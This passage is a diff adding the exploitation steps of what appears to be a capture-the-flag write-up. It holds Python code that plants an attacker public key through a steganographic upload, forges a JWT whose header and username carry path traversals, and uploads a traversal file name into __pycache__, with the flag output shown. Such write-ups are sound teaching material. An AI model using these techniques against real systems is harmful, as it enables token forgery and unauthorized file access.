@@ -485,6 +485,8 @@ The solution was to use a different \_\_pycache\_\_ inside the container: **/usr
 
 ### Exploiting
 
+1. **Keys**
+
 To start the game, let's generate our local keys to the fake JWT (just copied the Dockerfile command).
 
 ```bash
@@ -501,6 +503,138 @@ writing RSA key
 
 $ ls
 private.pem  public.pem
+```
+
+2. **Upload Public Key**
+
+We'll start using Python here to automate things. Let's code to upload our own key to the server (inside the secret message).
+
+```python=13
+def rand_string():
+    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+
+def get_file_for_upload(filename):
+    return {
+        'file': (filename, open('jpeg-home.jpg.jpg', 'rb')),
+    }
+
+def gen_public_key_on_server():
+    session = requests.Session()
+    session.get(f'{target_url}/')
+
+    files = get_file_for_upload(f'jpeg-home-{rand_string()}.jpg')
+
+    data = {
+        'content': open('keys/public.pem').read(),
+        'password': 'secret-1'
+    }
+
+    response = session.post(f'{target_url}/upload', files=files, data=data)
+    with open(outfilename, 'wb') as outfile:
+        outfile.write(response.content)
+        
+# ... lot of lines
+
+gen_public_key_on_server()
+```
+
+Let's call it:
+
+```bash
+$ python exploit.py
+$ file remote.jpg 
+remote.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 800x400, components 3
+```
+
+Nice, session generated and file with embeded content download.
+
+3. **Remote Public Key - File Name**
+
+Let's find the name of the Public Key in the server:
+
+```bash
+$ steghide --extract -sf remote.jpg -p secret-1
+wrote extracted data to "cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt".
+
+$ cat cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt
+-----BEGIN PUBLIC KEY-----
+MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAuQqLhAM8b50D5SXjZ+x8
+uoF32bCV2zMyUs3Bc0YJ94igYG8w2mGuFOIUsJRWMhiv/r4RNNqdVP+8aGWfI04O
+ps4e9jUQtGifjHcCSuxnFJkDnm2IZjbvvW4vMgb8vwms5jzNquXdMnnMkrUdCAXN
+GEjlJg4vJVSv8bMi8/soZTfj9cGL6NZeIjGgukt+aNlAiW6xj1dXuWr6MTzrqOKV
+V5/+/3SSxk57u5Q/boXem0MkKJLZlzH4YhrWNOx6gHXtsh3jbBD9ls7C8Udy37hw
+opU/gqQqIaOSi1RDsBjhsL40jmGcWQrGMl5YnDl8uw1Z4IsOmHThFsSXOn8Mi+iY
+Kkps2ITVdbY2Fh2GwoG8E7rxM1eIL0U4nznCMOxRFSHgD3V+NkT74ZXuq3R2Tseq
+ZrX5h9CWcGNWNleOC4TVOhRXa04hX+UujGOaSOcd32mAfCXMe8WopAc0gNOSfzNZ
+pv3AmgySKktlk5WsmlrOEp2LL3Ce660OTeeuHR56dUk7AgMBAAE=
+-----END PUBLIC KEY-----
+
+$ md5sum cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt
+d4bbed6c4f6074fdddd41a1d0aa68e18  cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt
+
+$ md5sum keys/public.pem 
+d4bbed6c4f6074fdddd41a1d0aa68e18  keys/public.pem
+```
+
+Check! We uploaded our public key file correctly and it's name on the server is **uploads/cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl.txt**.
+
+4. **Create fake token and get the flag**
+
+We can't separate this steps :)
+
+```python=10
+target_pub_file = 'cE6RF3KsYOatdu1ndr9eGkOQPJvE77Pl'
+
+# ... Lot of lines
+
+def create_token(username, pubkey):
+    priv_key = open('keys/private.pem', 'r').read()
+    token = jwt.encode({"username": username}, priv_key, algorithm='RS256', headers={'pubkey': pubkey})
+    return token.decode('ascii')
+
+def get_flag(token):
+    cookies = {
+        'session': token,
+    }
+
+    # files = get_file_for_upload('....//__pycache') # Server do not have it :@
+    files = get_file_for_upload('....//....//....//....//usr/local/lib/python3.8/http/__pycache')
+
+    data = {
+        'content': 'me',
+        'password': 'secret-1'
+    }
+
+    response = requests.post(f'{target_url}/upload', cookies=cookies, files=files, data=data)
+    return response.text
+
+def attack():
+    flag_path_traversal = f'_/../../../../../../../app/flag.txt'
+    pubkey_path_traversal = f'../{app_path}/uploads/{target_pub_file}.txt'
+
+    poisoned_token = create_token(flag_path_traversal, pubkey_path_traversal)
+
+    print(poisoned_token)
+
+    print(get_flag(poisoned_token))
+
+# gen_public_key_on_server()
+attack()
+```
+
+Run, Forrest, Run!
+
+```bash
+$ python exploit.py 
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsInB1YmtleSI6Ii4uLy9hcHAvdXBsb2Fkcy9jRTZSRjNLc1lPYXRkdTFuZHI5ZUdrT1FQSnZFNzdQbC50eHQifQ.eyJ1c2VybmFtZSI6Il8vLi4vLi4vLi4vLi4vLi4vLi4vLi4vYXBwL2ZsYWcudHh0In0.XQUkeMd7ZSBbaMFVDQNscQv3287OISZNxOlsAeaDT1i1FPXI8BJhNVrrSbcvxgU13n5FuMw1M7jEmZRNXZogeuhqMpPLveOuFxv56vb85eGNdNK6Vj3BNQyX9njRFZmLpIGPR8yMu2H3P0Cr6qCva5LYBx0uQxWiXesGOFVNTFkRKb-ViSLggWMSCgU0lB_QvRKRP0TPaSjiKpZpmbG2Zf140OmIA_pwc1whBKf9G4Pne_9dHyGX9FpNBXJduUOWjumdvJUyz_nkdyozmQHmE8k3oYPZuPbKsfJC009jhU7bpqdXUeWjn2mRTMYAv3FayK7BOr7-19tjl-NlConKOxPXVSbsGERfwTldHMIJqnETVvJ8ZCOeNfVC2TfWXfF-xlUg7DkPQ0qcmCsMlswPMGmiVWrD2xyK1DVE9vmSig8JO6bCqHbc3D-h9HTij1SNJqNjWK4CxnkVkjq2CN-64wMImaqvt5SQEfyteNcdiKbZOKcVRa0MVKCeyO_3n-Xj
+
+idek{0bl1g4t0ry_jWt_Ch4LL3nGe}
+```
+
+Flag for us!
+
+```
+idek{0bl1g4t0ry_jWt_Ch4LL3nGe}
 ```
 
 ## Fancy Notes
